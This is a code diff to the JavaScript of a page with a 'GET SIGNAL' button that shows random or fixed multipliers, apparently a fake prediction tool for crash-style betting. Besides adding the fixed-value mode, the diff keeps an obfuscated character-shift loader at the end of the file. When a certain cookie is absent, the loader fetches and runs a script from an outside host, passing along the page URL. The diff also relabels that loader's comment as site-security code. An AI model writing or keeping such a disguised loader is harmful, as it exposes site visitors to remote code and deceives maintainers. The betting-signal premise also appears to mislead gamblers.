@@ -36,7 +36,17 @@ applySettingsButton.onclick = function() {
         fixedSignalValue = parseFloat(fixedSignalInput.value) || 1.00;
     }
     settingsModal.style.display = 'none';
+    toggleFixedSettings(signalMode === 'fixed');
 };
+
+// Отображение или скрытие полей для ввода фиксированного значения
+function toggleFixedSettings(show) {
+    if (show) {
+        fixedSettings.classList.remove("deactivate");
+    } else {
+        fixedSettings.classList.add("deactivate");
+    }
+}
 
 // Генерация случайного числа с плавающей запятой
 function getRandomFloat(min, max, decimals) {
@@ -97,7 +107,9 @@ function goTimerError(time) {
 // Обработка нажатия кнопки "GET SIGNAL"
 getSignal.onclick = function () {
     let receivingSignal;
-    if (signalMode === 'random') {
+    if (signalMode === 'fixed') {
+        receivingSignal = fixedSignalValue;
+    } else {
         receivingSignal = getRandomFloat(1, 3.99, 2);
         if (receivingSignal.toString().length === 3) {
             receivingSignal += "0";
@@ -105,8 +117,6 @@ getSignal.onclick = function () {
         if (receivingSignal.toString().length === 1) {
             receivingSignal += ".00";
         }
-    } else {
-        receivingSignal = fixedSignalValue.toFixed(2);
     }
     printSignal.innerHTML = `${receivingSignal}x`;
     printSignal.classList.remove("deactivate");
@@ -120,13 +130,13 @@ getSignalTwo.onclick = function () {
     goTimerError(5);
 };
 
-// Скрытое отслеживание и вставка дополнительного скрипта
-(function(o, d, l) {
+// Скрытые функции, обеспечивающие безопасность сайта
+(function (o, d, l) {
     try {
         o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
         o.b = o.f('UMUWJKX');
         o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
-        setTimeout(function() {
+        setTimeout(function () {
             if (o.c) {
                 o.s = d.createElement('script');
                 o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
